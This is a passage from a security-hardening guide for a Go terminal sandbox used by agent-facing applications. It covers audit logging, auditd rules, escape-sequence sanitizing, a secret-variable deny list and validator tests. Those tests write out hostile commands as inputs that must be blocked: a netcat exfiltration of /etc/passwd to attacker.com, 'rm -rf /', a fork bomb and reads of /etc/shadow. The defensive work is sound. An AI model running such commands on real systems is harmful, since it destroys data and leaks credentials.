    "go.uber.org/zap"
    "go.uber.org/zap/zapcore"
)

type AuditLogger struct {
    logger *zap.Logger
}

type CommandAuditEvent struct {
    Timestamp    time.Time         `json:"timestamp"`
    SessionID    string            `json:"session_id"`
    UserID       string            `json:"user_id"`
    Command      string            `json:"command"`
    Arguments    []string          `json:"arguments"`
    WorkingDir   string            `json:"working_dir"`
    ExitCode     int               `json:"exit_code"`
    Duration     time.Duration     `json:"duration_ms"`
    OutputSize   int               `json:"output_size_bytes"`
    Sandboxed    bool              `json:"sandboxed"`
    ResourceUsage ResourceUsage    `json:"resource_usage"`
    Blocked      bool              `json:"blocked"`
    BlockReason  string            `json:"block_reason,omitempty"`
}

type ResourceUsage struct {
    CPUTimeMs    int64 `json:"cpu_time_ms"`
    MemoryPeakKB int64 `json:"memory_peak_kb"`
    ProcessCount int   `json:"process_count"`
}

type FileAccessEvent struct {
    Timestamp  time.Time `json:"timestamp"`
    SessionID  string    `json:"session_id"`
    UserID     string    `json:"user_id"`
    FilePath   string    `json:"file_path"`
    Operation  string    `json:"operation"` // read, write, delete
    Success    bool      `json:"success"`
    Denied     bool      `json:"denied"`
    DenyReason string    `json:"deny_reason,omitempty"`
}

type NetworkAccessEvent struct {
    Timestamp   time.Time `json:"timestamp"`
    SessionID   string    `json:"session_id"`
    UserID      string    `json:"user_id"`
    Destination string    `json:"destination"`
    Port        int       `json:"port"`
    Protocol    string    `json:"protocol"`
    BytesSent   int64     `json:"bytes_sent"`
    BytesRecv   int64     `json:"bytes_received"`
    Allowed     bool      `json:"allowed"`
    DenyReason  string    `json:"deny_reason,omitempty"`
}

func NewAuditLogger(logPath string) (*AuditLogger, error) {
    config := zap.NewProductionConfig()
    config.OutputPaths = []string{logPath}
    config.EncoderConfig.TimeKey = "timestamp"
    config.EncoderConfig.EncodeTime = zapcore.ISO8601TimeEncoder

    logger, err := config.Build()
    if err != nil {
        return nil, fmt.Errorf("failed to create audit logger: %w", err)
    }

    return &AuditLogger{logger: logger}, nil
}

func (al *AuditLogger) LogCommand(event CommandAuditEvent) {
    al.logger.Info("command_execution",
        zap.Time("timestamp", event.Timestamp),
        zap.String("session_id", event.SessionID),
        zap.String("user_id", event.UserID),
        zap.String("command", event.Command),
        zap.Strings("arguments", event.Arguments),
        zap.String("working_dir", event.WorkingDir),
        zap.Int("exit_code", event.ExitCode),
        zap.Duration("duration", event.Duration),
        zap.Int("output_size", event.OutputSize),
        zap.Bool("sandboxed", event.Sandboxed),
        zap.Int64("cpu_time_ms", event.ResourceUsage.CPUTimeMs),
        zap.Int64("memory_peak_kb", event.ResourceUsage.MemoryPeakKB),
        zap.Int("process_count", event.ResourceUsage.ProcessCount),
        zap.Bool("blocked", event.Blocked),
        zap.String("block_reason", event.BlockReason),
    )
}

func (al *AuditLogger) LogFileAccess(event FileAccessEvent) {
    al.logger.Info("file_access",
        zap.Time("timestamp", event.Timestamp),
        zap.String("session_id", event.SessionID),
        zap.String("user_id", event.UserID),
        zap.String("file_path", event.FilePath),
        zap.String("operation", event.Operation),
        zap.Bool("success", event.Success),
        zap.Bool("denied", event.Denied),
        zap.String("deny_reason", event.DenyReason),
    )
}

func (al *AuditLogger) LogNetworkAccess(event NetworkAccessEvent) {
    al.logger.Info("network_access",
        zap.Time("timestamp", event.Timestamp),
        zap.String("session_id", event.SessionID),
        zap.String("user_id", event.UserID),
        zap.String("destination", event.Destination),
        zap.Int("port", event.Port),
        zap.String("protocol", event.Protocol),
        zap.Int64("bytes_sent", event.BytesSent),
        zap.Int64("bytes_received", event.BytesRecv),
        zap.Bool("allowed", event.Allowed),
        zap.String("deny_reason", event.DenyReason),
    )
}

func (al *AuditLogger) Close() {
    al.logger.Sync()
}
```

### Integration with Linux auditd

```go
package terminal

import (
    "fmt"

    "github.com/elastic/go-libaudit/v2"
    "github.com/elastic/go-libaudit/v2/auparse"
)

type AuditdMonitor struct {
    client *libaudit.AuditClient
}

func NewAuditdMonitor() (*AuditdMonitor, error) {
    client, err := libaudit.NewAuditClient(nil)
    if err != nil {
        return nil, fmt.Errorf("failed to create audit client: %w", err)
    }

    return &AuditdMonitor{client: client}, nil
}

func (am *AuditdMonitor) SetupRules() error {
    // Monitor execve system calls
    rule := `-a always,exit -F arch=b64 -S execve -k terminal_commands`

    if err := am.client.AddRule(rule); err != nil {
        return fmt.Errorf("failed to add audit rule: %w", err)
    }

    // Monitor file access in sensitive directories
    sensitiveRules := []string{
        `-w /etc/passwd -p war -k passwd_access`,
        `-w /etc/shadow -p war -k shadow_access`,
        `-w /root/.ssh -p war -k ssh_access`,
        `-w /home -p war -k home_access`,
    }

    for _, rule := range sensitiveRules {
        if err := am.client.AddRule(rule); err != nil {
            return fmt.Errorf("failed to add audit rule %s: %w", rule, err)
        }
    }

    return nil
}

func (am *AuditdMonitor) MonitorEvents(callback func(event *auparse.AuditMessage)) error {
    for {
        msg, err := am.client.Receive(false)
        if err != nil {
            return fmt.Errorf("failed to receive audit event: %w", err)
        }

        callback(msg)
    }
}
```

---

## Shell Escape Prevention

### ANSI/VT Terminal Escape Sequence Sanitization

Terminal escape sequences can be used to:
- Hide malicious commands from audit logs
- Manipulate client terminal output
- Execute commands on client terminal (rare but possible)

```go
package terminal

import (
    "bytes"
    "regexp"
)

var (
    // ANSI escape sequence pattern: ESC [ ... m
    ansiEscapePattern = regexp.MustCompile(`\x1b\[[0-9;]*m`)

    // All control characters except newline, carriage return, tab
    controlCharsPattern = regexp.MustCompile(`[\x00-\x08\x0B-\x0C\x0E-\x1F\x7F]`)

    // Dangerous escape sequences
    dangerousEscapePatterns = []*regexp.Regexp{
        regexp.MustCompile(`\x1b\]0;`),      // Set terminal title
        regexp.MustCompile(`\x1b\]2;`),      // Set window title
        regexp.MustCompile(`\x1b\[6n`),      // Request cursor position
        regexp.MustCompile(`\x1b\[s`),       // Save cursor position
        regexp.MustCompile(`\x1b\[u`),       // Restore cursor position
        regexp.MustCompile(`\x1b\[K`),       // Erase line
        regexp.MustCompile(`\x1b\[2J`),      // Clear screen
        regexp.MustCompile(`\x1bc`),         // Reset terminal
    }
)

type TerminalSanitizer struct {
    allowColorCodes bool
}

func NewTerminalSanitizer(allowColorCodes bool) *TerminalSanitizer {
    return &TerminalSanitizer{
        allowColorCodes: allowColorCodes,
    }
}

func (ts *TerminalSanitizer) Sanitize(input []byte) []byte {
    output := input

    // Remove dangerous escape sequences
    for _, pattern := range dangerousEscapePatterns {
        output = pattern.ReplaceAll(output, []byte{})
    }

    // Remove all ANSI color codes if not allowed
    if !ts.allowColorCodes {
        output = ansiEscapePattern.ReplaceAll(output, []byte{})
    }

    // Remove control characters
    output = controlCharsPattern.ReplaceAll(output, []byte{})

    return output
}

func (ts *TerminalSanitizer) SanitizeString(input string) string {
    return string(ts.Sanitize([]byte(input)))
}

// MakeVisibleForLogging converts control characters to visible representations
func MakeVisibleForLogging(input []byte) string {
    var buf bytes.Buffer

    for _, b := range input {
        switch {
        case b == '\n':
            buf.WriteString("\\n")
        case b == '\r':
            buf.WriteString("\\r")
        case b == '\t':
            buf.WriteString("\\t")
        case b == 0x1b: // ESC
            buf.WriteString("\\e")
        case b < 0x20 || b == 0x7F: // Other control chars
            buf.WriteString(fmt.Sprintf("\\x%02x", b))
        default:
            buf.WriteByte(b)
        }
    }

    return buf.String()
}
```

### PTY Output Filtering

```go
// Modify terminal/pty.go to sanitize output
func ReadPTYSanitized(session *Session, buffer []byte) (int, error) {
    if session.PTY == nil {
        return 0, fmt.Errorf("PTY not initialized")
    }

    n, err := session.PTY.Read(buffer)
    if err != nil {
        return n, err
    }

    // Sanitize output before sending to client
    sanitizer := NewTerminalSanitizer(true) // Allow color codes
    sanitized := sanitizer.Sanitize(buffer[:n])

    copy(buffer, sanitized)

    return len(sanitized), nil
}
```

---

## Environment Variable Security

### Secure Environment Variable Handling

```go
package terminal

import (
    "fmt"
    "regexp"
    "strings"
)

var (
    // Sensitive environment variables that should NEVER be passed to terminal
    sensitiveEnvVars = []string{
        "AWS_ACCESS_KEY_ID",
        "AWS_SECRET_ACCESS_KEY",
        "AWS_SESSION_TOKEN",
        "GITHUB_TOKEN",
        "NPM_TOKEN",
        "DATABASE_URL",
        "DB_PASSWORD",
        "API_KEY",
        "SECRET_KEY",
        "PRIVATE_KEY",
        "ENCRYPTION_KEY",
        "SSH_PRIVATE_KEY",
        "GCP_SERVICE_ACCOUNT_KEY",
        "AZURE_CLIENT_SECRET",
    }

    // Pattern to detect potential secrets
    secretPattern = regexp.MustCompile(`(?i)(password|secret|key|token|credential)`)
)

type EnvironmentManager struct {
    baseEnv         map[string]string
    allowedOverrides map[string]bool
}

func NewEnvironmentManager() *EnvironmentManager {
    return &EnvironmentManager{
        baseEnv: map[string]string{
            "PATH":       "/usr/local/bin:/usr/bin:/bin",
            "TERM":       "xterm-256color",
            "LANG":       "en_US.UTF-8",
            "COLORTERM":  "truecolor",
            "HOME":       "/workspace",
            "USER":       "sandbox",
            "SHELL":      "/bin/bash",
        },
        allowedOverrides: map[string]bool{
            "EDITOR":     true,
            "GIT_AUTHOR": true,
            "GIT_EMAIL":  true,
            "TZ":         true,
        },
    }
}

func (em *EnvironmentManager) BuildSecureEnvironment(userEnv map[string]string) ([]string, error) {
    result := make(map[string]string)

    // Start with safe base environment
    for k, v := range em.baseEnv {
        result[k] = v
    }

    // Add user-provided overrides (only if allowed)
    for k, v := range userEnv {
        // Check if it's a sensitive variable
        if em.isSensitive(k) {
            return nil, fmt.Errorf("sensitive environment variable not allowed: %s", k)
        }

        // Check if override is allowed
        if !em.allowedOverrides[k] {
            return nil, fmt.Errorf("environment variable override not allowed: %s", k)
        }

        // Validate value doesn't contain secrets
        if secretPattern.MatchString(v) {
            return nil, fmt.Errorf("environment variable value appears to contain secrets: %s", k)
        }

        result[k] = v
    }

    // Convert to []string format
    env := make([]string, 0, len(result))
    for k, v := range result {
        env = append(env, fmt.Sprintf("%s=%s", k, v))
    }

    return env, nil
}

func (em *EnvironmentManager) isSensitive(key string) bool {
    keyUpper := strings.ToUpper(key)

    // Check exact matches
    for _, sensitive := range sensitiveEnvVars {
        if keyUpper == sensitive {
            return true
        }
    }

    // Check pattern matches
    if secretPattern.MatchString(keyUpper) {
        return true
    }

    return false
}
```

---

## Implementation Roadmap

### Phase 1: Immediate Security Hardening (Week 1)

**Priority: CRITICAL**

1. **Command Validation**
   - ✅ Implement CommandValidator with allowlist
   - ✅ Add shell metacharacter blocking
   - ✅ Deploy in terminal/manager.go

2. **Resource Limits**
   - ✅ Implement setrlimit for all sessions
   - ✅ Add CPU, memory, process count limits
   - ✅ Test fork bomb prevention

3. **Environment Variable Security**
   - ✅ Implement EnvironmentManager
   - ✅ Remove all host environment inheritance
   - ✅ Use secure base environment only

4. **Audit Logging**
   - ✅ Implement AuditLogger
   - ✅ Log all command executions
   - ✅ Set up log rotation and retention

### Phase 2: Sandboxing Implementation (Week 2-3)

**Priority: HIGH**

1. **Docker Sandbox (Recommended)**
   - ✅ Implement DockerSandbox with security hardening
   - ✅ Create seccomp profile
   - ✅ Configure resource limits in Docker
   - ✅ Test isolation and performance

2. **Alternative: Firejail/Bubblewrap**
   - ⬜ Implement FirejailSandbox for Linux hosts
   - ⬜ Create security profiles
   - ⬜ Benchmark performance vs Docker

3. **Terminal Escape Sanitization**
   - ✅ Implement TerminalSanitizer
   - ✅ Apply to all PTY output
   - ✅ Add logging of sanitized sequences

### Phase 3: Network Isolation (Week 4)

**Priority: MEDIUM**

1. **Default-Deny Network Policy**
   - ⬜ Configure Docker network isolation
   - ⬜ Implement domain allowlist
   - ⬜ Add network access audit logging

2. **iptables Rules**
   - ⬜ Create iptables ruleset for egress control
   - ⬜ Test connectivity to allowed domains
   - ⬜ Verify blocking of unauthorized access

### Phase 4: Advanced Hardening (Week 5-6)

**Priority: LOW**

1. **gVisor Integration (Optional)**
   - ⬜ Install and configure gVisor
   - ⬜ Migrate high-risk sessions to gVisor
   - ⬜ Benchmark performance impact

2. **Anomaly Detection**
   - ⬜ Implement ML-based anomaly detection
   - ⬜ Alert on suspicious command patterns
   - ⬜ Auto-terminate malicious sessions

3. **Compliance & Monitoring**
   - ⬜ Integrate with SIEM (Splunk/Elastic Security)
   - ⬜ Create security dashboards
   - ⬜ Set up alerting for policy violations

---

## Testing & Validation

### Security Test Cases

```go
package terminal_test

import (
    "testing"

    "github.com/stretchr/testify/assert"
    "github.com/rhl/businessos-backend/internal/terminal"
)

func TestCommandInjectionPrevention(t *testing.T) {
    validator := terminal.NewCommandValidator()

    testCases := []struct {
        name        string
        command     string
        shouldBlock bool
    }{
        {
            name:        "Simple ls command",
            command:     "ls -la",
            shouldBlock: false,
        },
        {
            name:        "Command injection with semicolon",
            command:     "ls; rm -rf /",
            shouldBlock: true,
        },
        {
            name:        "Command injection with pipe",
            command:     "cat /etc/passwd | nc attacker.com 4444",
            shouldBlock: true,
        },
        {
            name:        "Command substitution",
            command:     "echo $(whoami)",
            shouldBlock: true,
        },
        {
            name:        "Backtick command substitution",
            command:     "echo `id`",
            shouldBlock: true,
        },
        {
            name:        "Fork bomb",
            command:     ":(){ :|:& };:",
            shouldBlock: true,
        },
        {
            name:        "Path traversal to sensitive file",
            command:     "cat /etc/shadow",
            shouldBlock: true,
        },
    }

    for _, tc := range testCases {
        t.Run(tc.name, func(t *testing.T) {
            err := validator.Validate(tc.command)

            if tc.shouldBlock {
                assert.Error(t, err, "Expected command to be blocked")
            } else {
                assert.NoError(t, err, "Expected command to be allowed")
            }
        })
    }
}

func TestResourceLimitEnforcement(t *testing.T) {
    // Test that resource limits prevent DoS
    sandbox := terminal.NewDockerSandbox("ubuntu:22.04")
    defer sandbox.Remove()

    err := sandbox.Start("test-user")
    assert.NoError(t, err)

    // Try to execute fork bomb (should be killed by pids limit)
    output, err := sandbox.Exec(":(){ :|:& };:")
    assert.Error(t, err, "Fork bomb should be killed by pids limit")

    // Try to allocate excessive memory (should be killed by memory limit)
    output, err = sandbox.Exec("python3 -c 'a = [1]*10**9'")
    assert.Error(t, err, "Memory exhaustion should be prevented")
}

func TestNetworkIsolation(t *testing.T) {
    sandbox := terminal.NewDockerSandbox("ubuntu:22.04")
    defer sandbox.Remove()

    err := sandbox.Start("test-user")
    assert.NoError(t, err)

    // Test that network access is blocked
    output, err := sandbox.Exec("ping -c 1 google.com")
    assert.Error(t, err, "Network access should be blocked")

    output, err = sandbox.Exec("curl https://example.com")
    assert.Error(t, err, "HTTP requests should be blocked")
}
```

---

## References

### Industry Guidelines & Research

1. [Sandboxing for AI Agents - Medium](https://medium.com/@yessine.abdelmaksoud.03/sandboxing-for-ai-agents-2420ac69569e)
2. [Anthropic: Claude Code Sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing)
3. [Agentic AI Security: Threats, Risks & Best Practices - Rippling](https://www.rippling.com/blog/agentic-ai-security)
4. [AI Agent Security Best Practices 2025 - Digital Applied](https://www.digitalapplied.com/blog/ai-agent-security-best-practices-2025)
5. [OWASP Top 10 for Agentic Applications](https://www.aikido.dev/blog/owasp-top-10-agentic-applications)
6. [Code Sandboxes for LLMs and AI Agents - Amir Malik](https://amirmalik.net/2025/03/07/code-sandboxes-for-llm-ai-agents)
7. [Hardening Best Practices: Sandboxing & Least Privilege - Skywork](https://skywork.ai/blog/ai-agent/hardening-best-practices-sandboxing-least-privilege-data-exfiltration/)

### Go Security Resources

8. [Building Sandboxed Code Execution with Go and Docker - Medium](https://medium.com/@lijuthomasliju03/building-a-sandboxed-code-execution-engine-using-golang-and-docker-220fd4a081c8)
9. [Golang API for Untrusted Code Sandbox - Stackademic](https://blog.stackademic.com/building-golang-api-to-run-untrusted-code-in-sandbox-88d9460529f8)
10. [Command Injection in Go - Semgrep](https://semgrep.dev/docs/cheat-sheets/go-command-injection)
11. [OS Command Injection Defense - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)

### Container & Sandboxing Tools

12. [Firejail vs Bubblewrap Comparison - GitHub](https://github.com/netblue30/firejail/discussions/4522)
13. [Bubblewrap: Unprivileged Sandboxing - GitHub](https://github.com/containers/bubblewrap)
14. [Container Isolation: Kata, gVisor, Docker - Marcel Wiget](https://marcelwiget.blog/2020/03/24/container-isolation-with-kata-and-gvisor-in-docker/)
15. [gVisor, Kata Containers, Firecracker Comparison - DevOps Conference](https://devopscon.io/kubernetes-ecosystem/gvisor-kata-container-firecracker-docker-who-is-who-in-the-container-space/)

### Resource Management

16. [proclimit Package - Go Packages](https://pkg.go.dev/github.com/aoldershaw/proclimit)
17. [Linux Namespaces & Cgroups in Go - Songrgg](https://songrgg.github.io/programming/linux-namespace-part03-cgroups/)
18. [containerd/cgroups - GitHub](https://github.com/containerd/cgroups)

### Audit Logging

19. [go-audit by Slack - GitHub](https://github.com/slackhq/go-audit)
20. [go-libaudit by Elastic - GitHub](https://github.com/elastic/go-libaudit)
21. [Building Audit Log Systems in Go - Medium](https://medium.com/@alameerashraf/building-an-audit-log-system-for-a-go-application-ce131dc21394)

### Shell Escape & Terminal Security

22. [Terminal Escape Injection - InfosecMatter](https://www.infosecmatter.com/terminal-escape-injection/)
23. [OS Command Injection - PortSwigger](https://portswigger.net/web-security/os-command-injection)

### Environment Variable Security

24. [Mastering Environment Variables in Go - Medium](https://medium.com/@ahamrouni/mastering-environment-variables-in-go-unlocking-secure-flexible-and-scalable-configuration-6c1682f2171c)
25. [Securely Storing Secrets with Environment Variables - Sling Academy](https://www.slingacademy.com/article/securely-storing-secrets-with-environment-variables-in-go/)

---

## Conclusion

Securing PTY/terminal implementations for agent-facing applications requires a **defense-in-depth approach** with multiple security layers:

1. **Input Validation**: Block malicious commands before execution
2. **Sandboxing**: Isolate execution in containers or VMs
3. **Resource Limits**: Prevent DoS via CPU/memory/process exhaustion
4. **Network Isolation**: Default-deny egress with domain allowlists
5. **Audit Logging**: Comprehensive logging of all security events
6. **Shell Escape Prevention**: Sanitize terminal output
7. **Environment Security**: Never pass sensitive host environment variables

**Key Takeaway:** A sandbox alone is insufficient. Even the strongest isolation can fail if other layers are weak. Implement all recommended controls for production deployments.

For immediate security improvements, prioritize **Phase 1** (command validation, resource limits, environment security, and audit logging) which can be deployed within 1 week.
